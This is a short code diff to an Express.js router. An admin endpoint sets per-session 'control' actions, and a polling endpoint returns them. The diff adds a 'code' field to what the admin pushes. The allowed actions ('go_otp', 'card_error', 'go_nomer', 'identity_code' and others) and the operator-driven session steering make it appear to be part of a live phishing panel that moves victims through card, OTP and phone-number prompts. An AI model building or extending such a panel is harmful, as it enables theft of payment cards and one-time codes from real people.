@@ -20,18 +20,18 @@ function requireAuth(
 router.get("/control/:sessionId", (req, res): void => {
   const raw = req.params.sessionId;
   const sessionId = Array.isArray(raw) ? raw[0] : raw;
-  const action = getControl(sessionId);
-  if (!action) {
+  const result = getControl(sessionId);
+  if (!result) {
     res.json({ action: null });
     return;
   }
-  res.json({ action });
+  res.json({ action: result.action, code: result.code });
 });
 
 router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
   const rawSessionId = req.params.sessionId;
   const sessionId = Array.isArray(rawSessionId) ? rawSessionId[0] : rawSessionId;
-  const { action } = req.body as { action?: string };
+  const { action, code } = req.body as { action?: string; code?: string };
 
   const allowed: ControlAction[] = ["go_otp", "go_otp2", "card_error", "go_nomer", "nomer_error", "identity_code"];
   if (!action || !allowed.includes(action as ControlAction)) {
@@ -39,8 +39,8 @@ router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
     return;
   }
 
-  setControl(sessionId, action as ControlAction);
-  res.json({ success: true, sessionId, action });
+  setControl(sessionId, action as ControlAction, code);
+  res.json({ success: true, sessionId, action, code });
 });
 
 export default router;
